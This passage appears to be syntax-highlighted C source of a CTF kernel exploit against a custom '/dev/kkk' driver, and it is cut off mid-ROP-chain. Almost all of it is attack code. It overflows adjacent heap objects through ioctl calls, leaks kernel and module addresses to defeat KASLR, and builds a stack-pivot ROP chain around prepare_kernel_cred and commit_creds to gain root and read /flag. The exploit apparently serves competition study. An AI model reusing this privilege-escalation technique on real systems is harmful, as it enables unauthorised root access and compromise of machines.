</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span><span class="lnt">407
</span><span class="lnt">408
</span><span class="lnt">409
</span><span class="lnt">410
</span><span class="lnt">411
</span><span class="lnt">412
</span><span class="lnt">413
</span><span class="lnt">414
</span><span class="lnt">415
</span><span class="lnt">416
</span><span class="lnt">417
</span><span class="lnt">418
</span><span class="lnt">419
</span><span class="lnt">420
</span><span class="lnt">421
</span><span class="lnt">422
</span><span class="lnt">423
</span><span class="lnt">424
</span><span class="lnt">425
</span><span class="lnt">426
</span><span class="lnt">427
</span><span class="lnt">428
</span><span class="lnt">429
</span><span class="lnt">430
</span><span class="lnt">431
</span><span class="lnt">432
</span><span class="lnt">433
</span><span class="lnt">434
</span><span class="lnt">435
</span><span class="lnt">436
</span><span class="lnt">437
</span><span class="lnt">438
</span><span class="lnt">439
</span><span class="lnt">440
</span><span class="lnt">441
</span><span class="lnt">442
</span><span class="lnt">443
</span><span class="lnt">444
</span><span class="lnt">445
</span><span class="lnt">446
</span><span class="lnt">447
</span><span class="lnt">448
</span><span class="lnt">449
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// this POC demonstrates the oob ability
</span><span class="c1"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cm">/* ioctl commands */</span>
<span class="cp">#define KKK_IOCTL_ADD _IO(&#39;k&#39;, 100)
</span><span class="cp">#define KKK_IOCTL_UPDATE _IO(&#39;k&#39;, 103)
</span><span class="cp">#define KKK_IOCTL_DUMP _IO(&#39;k&#39;, 105)
</span><span class="cp">#define KKK_IOCTL_LAUNCH _IO(&#39;k&#39;, 107)
</span><span class="cp">#define KKK_IOCTL_DETACH _IO(&#39;k&#39;, 109)
</span><span class="cp"></span>
<span class="cp">#define MAX_OBJECT_NUM (16)
</span><span class="cp"></span>
<span class="k">enum</span> <span class="n">kkk_type</span>
<span class="p">{</span>
    <span class="n">KKK_CRYPTO_DES</span><span class="p">,</span>
    <span class="n">KKK_CRYPTO_3DES</span><span class="p">,</span>
    <span class="n">KKK_CRYPTO_AES128</span><span class="p">,</span>
    <span class="n">KKK_CRYPTO_AES256</span><span class="p">,</span>
    <span class="n">KKK_CRYPTO_NUM</span>
<span class="p">};</span>

<span class="cm">/* core data strcutres */</span>
<span class="k">struct</span> <span class="n">kkk_pack</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span> <span class="c1">// user space pointer
</span><span class="c1"></span><span class="p">};</span>

<span class="k">struct</span> <span class="n">kkk_obj</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">keypack</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">datapack</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">enc</span><span class="p">;</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">handler</span><span class="p">)(</span><span class="k">struct</span> <span class="n">kkk_obj</span> <span class="o">*</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">kkk_ioctl_add_arg</span>
<span class="p">{</span>
    <span class="k">enum</span> <span class="n">kkk_type</span> <span class="n">type</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">enc</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// we are sorry to introduce this structure
</span><span class="c1">// only now we can use one indirect call to pivot the stack to heap
</span><span class="c1"></span><span class="k">struct</span> <span class="n">kkk_ioctl_other_arg</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">privileged_function</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;uid: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/flag&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">privileged_function</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">save_state</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">&#34;.intel_syntax noprefix;&#34;</span>
            <span class="s">&#34;mov user_cs, cs;&#34;</span>
            <span class="s">&#34;mov user_ss, ss;&#34;</span>
            <span class="s">&#34;mov user_sp, rsp;&#34;</span>
            <span class="s">&#34;pushf;&#34;</span>
            <span class="s">&#34;pop user_rflags;&#34;</span>
            <span class="s">&#34;.att_syntax&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">kkk_ioctl_add_arg</span> <span class="n">add_arg</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="k">struct</span> <span class="n">kkk_ioctl_other_arg</span> <span class="n">other_arg</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="c1">// ============ LEAK ============
</span><span class="c1"></span>    <span class="c1">// 1 - open
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/kkk&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">r</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// 2 - add two adjacent objects
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">450</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="c1">// bruteforce result here
</span><span class="c1"></span>    <span class="c1">// # prefix b&#39;\xee)\xa4\xbd\x9a.&#39; support value 1022
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\xee</span><span class="s">)</span><span class="se">\xa4\xbd\x9a</span><span class="s">.&#34;</span><span class="p">,</span> <span class="mi">14</span><span class="p">);</span>

    <span class="n">add_arg</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">KKK_CRYPTO_DES</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">enc</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">450</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span> <span class="c1">// 2 bytes misaligan :)
</span><span class="c1"></span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">add_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">add_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">add_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// make the kernel stack bigger enough
</span><span class="c1"></span>    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">add_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// then we try to overflow with launch
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_LAUNCH</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_LAUNCH&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// the id&#39;1 keysize will now be extremely large
</span><span class="c1"></span>    <span class="c1">// dump it
</span><span class="c1"></span>    <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">keybuf</span><span class="p">[</span><span class="mi">65535</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">databuf</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">keybuf</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_DUMP</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_DUMP&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// since keylength is 450
</span><span class="c1"></span>    <span class="c1">//       data is 14
</span><span class="c1"></span>    <span class="k">struct</span> <span class="n">kkk_obj</span> <span class="o">*</span><span class="n">obj</span> <span class="o">=</span> <span class="n">keybuf</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;leaked:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;key heap address: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">keypack</span><span class="p">.</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;data heap address: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">datapack</span><span class="p">.</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;handler adddress: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">handler</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">module_kaslroffset</span> <span class="o">=</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">handler</span> <span class="o">-</span> <span class="mh">0xffffffffc0000510ul</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;module kaslr offset: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">module_kaslroffset</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">module_load_address</span> <span class="o">=</span> <span class="mh">0xffffffffc0000000ul</span> <span class="o">+</span> <span class="n">module_kaslroffset</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;module loaded at: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">module_load_address</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kkk_fops_address</span> <span class="o">=</span> <span class="mh">0xffffffffc0001180ul</span> <span class="o">+</span> <span class="n">module_kaslroffset</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kkk_fops_size</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span> <span class="c1">// 16 is enough
</span><span class="c1"></span>
    <span class="c1">// we hence exploit third chunks key and data ptr to read kkk_fops
</span><span class="c1"></span>    <span class="kt">char</span> <span class="n">updatedkey</span><span class="p">[</span><span class="mh">0x3fe</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="c1">// key size
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kkk_fops_size</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// overflow key pointer
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kkk_fops_address</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">updatedkey</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_UPDATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_UPDATE&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_DUMP</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_DUMP&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">no_llseek_address</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">no_llseek_address</span><span class="p">,</span> <span class="n">key</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;no_llseek address: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">no_llseek_address</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">no_llseek_address</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// buggy hence drop
</span><span class="c1"></span>        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kaslroffset</span> <span class="o">=</span> <span class="n">no_llseek_address</span> <span class="o">-</span> <span class="mh">0xffffffff812258e0ul</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;core KASLR offset: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kaslroffset</span><span class="p">);</span>

    <span class="c1">// recover third chunk key size and data ??? need to?
</span><span class="c1"></span>    <span class="c1">// starts ROP 
</span><span class="c1"></span>    <span class="n">save_state</span><span class="p">();</span>
    
    <span class="c1">// 0xffffffff8106df19: mov rsp, qword ptr [rsp + 0x20]; pop rbx; pop rbp; ret;
</span><span class="c1"></span>    <span class="n">memset</span><span class="p">(</span><span class="n">updatedkey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">updatedkey</span><span class="p">));</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">updatedkey</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">databuf</span><span class="p">;</span>

    <span class="c1">// third need to be placed ROP stuff in key
</span><span class="c1"></span>    <span class="c1">// POC: try printk as an example
</span><span class="c1"></span>    <span class="c1">// 0xffffffff81001614: pop rdi; ret;
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">PIVOT_GADGET</span> <span class="o">=</span> <span class="mh">0xffffffff8106df19ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">POP_RDI_GADGET</span> <span class="o">=</span> <span class="mh">0xffffffff81001614ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">RBX</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">RBP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">RDI_PRINTK_ARG</span> <span class="o">=</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">datapack</span><span class="p">.</span><span class="n">ptr</span><span class="p">;</span>
    <span class="c1">// ffffffff81c5e83f T _printk
</span><span class="c1"></span>    <span class="c1">// why my printk is a lot of mess
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">PRINTK</span> <span class="o">=</span> <span class="mh">0xffffffff81c5e83ful</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// ffffffff8109bf90 T prepare_kernel_cred
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">PREPARE_KERNEL_CRED</span> <span class="o">=</span> <span class="mh">0xffffffff8109bf90ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// ffffffff8109bcf0 T commit_creds
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">COMMIT_CREDS</span> <span class="o">=</span> <span class="mh">0xffffffff8109bcf0ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// 0xffffffff8126a99e &lt;mark_buffer_dirty+254&gt;:	test   edi,esi
</span><span class="c1"></span>    <span class="c1">// this possibly can change the flag
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">TEST_ESI_EDI</span> <span class="o">=</span> <span class="mh">0xffffffff8126a99eul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// 0xffffffff8162fc5b: mov rdi, rax; jne 0x630c33; mov eax, ebx; pop rbx; pop rbp; ret
</span><span class="c1"></span>    <span class="c1">// can we use this one (without jump) need to debug
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">MOV_RDI_RAX</span> <span class="o">=</span> <span class="mh">0xffffffff8162fc5bul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>

    <span class="c1">// the pivot gadget will pop rbx and rbp,
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">40</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PIVOT_GADGET</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RBX</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RBP</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// prepare 0 to RDI
